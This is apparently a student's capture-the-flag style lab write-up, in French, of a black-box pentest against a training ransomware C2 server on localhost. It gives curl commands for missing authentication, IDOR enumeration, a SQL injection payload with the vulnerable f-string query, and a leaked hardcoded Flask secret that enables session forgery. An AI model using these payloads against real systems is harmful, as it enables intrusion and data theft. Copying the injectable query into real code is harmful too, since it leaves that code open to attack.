# Writeup — Exploit Avancé du Serveur C2
# TP Jour 5 — Challenge 3 | Djimy DONKENG | 2026-07-31

## Méthodologie

Approche boîte noire : test de tous les endpoints sans regarder le code source au préalable.

### Reconnaissance

```bash
# Lister les endpoints disponibles
curl http://localhost:5000/
curl http://localhost:5000/api/victims
curl http://localhost:5000/api/keys
curl http://localhost:5000/api/victim/1
curl http://localhost:5000/api/search?name=test
curl http://localhost:5000/api/debug/config
```

## Exploit 1 — Absence d'Authentification

**Requête :**
```bash
curl http://localhost:5000/api/victims
curl http://localhost:5000/api/keys
```

**Résultat :** Toutes les victimes et toutes les clés retournées sans aucun token ni login.

**Impact :** N'importe qui sur le réseau peut récupérer la clé XOR et déchiffrer ses fichiers
sans payer la rançon. Le modèle économique du ransomware est complètement brisé.

## Exploit 2 — IDOR

**Requête :**
```bash
for i in 1 2 3; do curl http://localhost:5000/api/victim/$i; done
```

**Résultat :** Données de chaque victime retournées en changeant simplement l'entier dans l'URL.

**Impact :** Énumération complète de toutes les victimes sans limite.

## Exploit 3 — Injection SQL

**Requête :**
```bash
curl -G "http://localhost:5000/api/search" --data-urlencode "name=' OR '1'='1"
```

**Requête SQL générée côté serveur (vulnérable) :**
```python
# Code vulnérable dans app.py
query = f"SELECT * FROM victims WHERE hostname LIKE '%{name}%'"
```

**Payload injecté :**
```sql
SELECT * FROM victims WHERE hostname LIKE '%' OR '1'='1%'
```

La condition `'1'='1'` est toujours vraie → toutes les lignes retournées.

**Impact :** Dump complet de la table victims. Avec des payloads UNION, on pourrait
accéder à d'autres tables (users, admin, etc.).

## Exploit 4 — Configuration Exposée

**Requête :**
```bash
curl http://localhost:5000/api/debug/config
```

**Résultat :**
```json
{
  "ADMIN_PASSWORD": "password123",
  "SECRET_KEY": "super_secret_key_hardcoded_123",
  "DEBUG": true
}
```

**Impact chaîné :**
- `SECRET_KEY` connue → forge de cookie de session Flask
- Un attaquant peut créer un cookie signé avec ce secret et se connecter comme admin
- `DEBUG=true` en Flask active Werkzeug Debugger (console Python interactive en production)

## Script d'Exploitation Automatisé

Voir `exploit.py` — automatise les 4 exploits et affiche un résumé d'impact.

**Exécution :**
```bash
# S'assurer que le serveur C2 est lancé
cd ../Etape5_PentestWeb/c2_server && python3 app.py &

# Lancer l'exploit
python3 exploit.py
```

## Limites

- Pas de RCE obtenu (SQLite ne supporte pas `load_extension` par défaut)
- Pas de SSTI (les templates Flask sont correctement échappés dans cette version)
- L'exploit reste dans le cadre HTTP/API, pas de shell système
